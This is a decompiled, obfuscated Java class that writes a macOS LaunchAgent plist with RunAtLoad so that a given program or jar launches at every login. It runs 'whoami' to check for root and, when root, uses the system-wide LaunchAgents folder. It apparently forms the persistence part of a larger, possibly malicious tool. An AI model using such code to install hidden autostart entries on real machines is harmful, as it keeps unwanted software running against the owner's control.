package b;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public final class c extends a {
   public c(String var1, String var2, boolean var3) {
      super(var1, var2, var3);
   }

   private static File b() {
      String var0 = System.getProperty("user.home");
      if (a.c.b().a() != a.c.a && (new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream()))).readLine().equals("root")) {
         var0 = "";
      }

      return new File(var0 + "/Library/LaunchAgents/");
   }

   public final void a() {
      if (!b().exists()) {
         b().mkdirs();
      }

      File var1 = new File(b(), super.b + ".plist");
      PrintWriter var2;
      (var2 = new PrintWriter(new FileWriter(var1))).println("<plist version=\"1.0\">");
      var2.println("<dict>");
      var2.println("\t<key>Label</key>");
      var2.println("\t<string>" + super.b + "</string>");
      var2.println("\t<key>ProgramArguments</key>");
      var2.println("\t<array>");
      if (this.a) {
         var2.println("\t\t<string>java</string>");
         var2.println("\t\t<string>-jar</string>");
      }

      var2.println("\t\t<string>" + super.c + "</string>");
      var2.println("\t</array>");
      var2.println("\t<key>RunAtLoad</key>");
      var2.println("\t<true/>");
      var2.println("</dict>");
      var2.println("</plist>");
      var2.close();
   }
}
